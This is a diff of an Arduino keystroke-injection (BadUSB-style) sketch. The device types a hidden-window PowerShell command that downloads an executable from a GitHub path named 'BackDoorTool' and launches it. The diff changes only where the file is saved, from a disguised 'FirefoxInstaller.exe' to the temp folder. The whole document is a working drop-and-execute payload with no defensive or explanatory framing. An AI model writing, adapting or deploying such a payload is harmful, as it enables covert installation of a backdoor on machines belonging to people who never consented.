@@ -25,7 +25,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(500);
   
-  Keyboard.print("powershell -windowstyle hidden Invoke-WebRequest https://raw.githubusercontent.com/Hung-Jia-Jun/python/master/BackDoorTool/server.exe -OutFile FirefoxInstaller.exe; Start-Process FirefoxInstaller.exe");
+  Keyboard.print("powershell -windowstyle hidden Invoke-WebRequest https://raw.githubusercontent.com/Hung-Jia-Jun/python/master/BackDoorTool/server.exe -OutFile %TEMP%\server.exe; Start-Process %TEMP%\server.exe");
   delay(1000);
   
   type(KEY_RETURN,false);
